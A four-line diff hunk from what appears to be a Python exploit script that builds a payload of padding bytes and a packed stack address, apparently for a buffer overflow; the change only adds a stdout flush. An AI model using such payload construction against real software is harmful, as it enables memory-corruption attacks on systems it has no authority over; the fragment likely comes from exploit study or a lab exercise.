@@ -10,3 +10,4 @@ payload += b'B' * 8
 payload += struct.pack('<Q', stack_addr)
 
 sys.stdout.buffer.write(payload)
+sys.stdout.buffer.flush()
